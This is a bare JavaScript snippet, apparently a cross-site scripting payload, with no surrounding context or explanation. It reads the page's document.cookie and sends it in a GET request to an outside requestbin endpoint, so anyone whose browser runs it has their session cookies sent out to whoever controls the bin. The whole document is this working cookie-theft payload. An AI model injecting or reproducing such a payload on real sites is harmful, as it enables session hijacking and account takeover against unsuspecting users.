const Http = new XMLHttpRequest();
const url='http://requestbin.fullcontact.com/1703nj31?c='+document.cookie+'&z=wow';

Http.open("GET", url);
Http.send();
